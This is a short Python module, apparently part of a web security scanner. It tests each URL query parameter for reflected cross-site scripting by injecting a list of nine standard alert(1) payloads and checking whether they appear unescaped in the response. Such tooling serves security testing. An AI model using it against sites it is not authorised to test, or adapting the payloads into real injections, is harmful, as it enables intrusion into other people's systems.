from ..core.client import fetch
from ..core.utils import extract_params
from urllib.parse import urlparse, urlencode, quote

PAYLOADS = [
    "<script>alert(1)</script>",
    "\"><script>alert(1)</script>",
    "'><script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "\"><img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "javascript:alert(1)",
    "\" autofocus onfocus=alert(1) x=\"",
    "'-alert(1)-'",
]


def check_xss(url):
    findings = []
    if "?" not in url:
        return findings
    parsed = urlparse(url)
    from urllib.parse import parse_qs
    params = parse_qs(parsed.query)
    base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

    for param in params:
        for payload in PAYLOADS:
            qs = params.copy()
            qs[param] = [payload]
            u = f"{base}?{urlencode(qs, doseq=True)}"
            s, h, b = fetch(u, timeout=8)
            if s and payload in b:
                findings.append({
                    "name": f"Reflected XSS ({param})",
                    "severity": "HIGH",
                    "url": u,
                    "payload": payload
                })
                break
    return findings
